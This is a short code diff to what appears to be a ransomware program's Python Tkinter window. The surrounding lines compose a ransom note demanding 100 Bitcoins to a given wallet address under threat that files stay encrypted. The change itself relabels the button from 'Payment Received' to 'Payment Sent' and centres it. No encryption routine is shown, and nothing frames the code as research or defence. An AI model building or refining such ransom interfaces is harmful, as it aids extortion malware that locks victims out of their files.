@@ -43,8 +43,10 @@ class App(Thread):
         message += "Send 100 Bitcoins to the wallet address mentioned below or your files remain encrypted;)\n"
         message += "                             Wallet Address: 3FxAwHJ6AvmnU8NAoY8qFVEteddRbdkjhx"
 
-        btn = Button(frame, text = 'Payment Received',command = self.dialog1)
-        btn.pack(side = RIGHT , padx =5)
+        btn = Button(frame, text = 'Payment Sent',command = self.dialog1)
+        btn.pack()
+        btn.place(relx=0.5, rely=0.5, anchor='center')
+
         l = Label(self.root, text = message)
         l.config(font =("Courier", 14))
         l.pack()
